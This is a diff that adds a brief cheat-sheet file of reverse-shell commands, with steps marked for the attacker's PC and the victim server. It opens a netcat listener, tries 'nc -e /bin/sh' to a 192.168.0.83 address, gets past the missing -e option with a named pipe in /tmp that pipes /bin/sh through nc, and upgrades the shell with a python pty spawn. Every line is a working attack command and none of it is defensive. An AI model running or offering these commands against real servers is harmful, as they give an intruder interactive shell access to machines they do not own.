@@ -1,0 +1,18 @@
+$yourpc: nc -lvp 4444
+
+$victimserver: nc -e /bin/sh 192.168.0.83 4444
+nc: invalid option -- 'e'
+
+
+#Try
+
+$yourpc: nc -lvp 4444
+
+$victimserver: mknod /tmp/backpipe p
+
+$victimserver: /bin/sh 0</tmp/backpipe | nc 192.168.0.83 4444  1>/tmp/backpipe
+
+
+#Spawn sh3ll
+
+$victimserver: python -c 'import pty; pty.spawn("/bin/sh")'
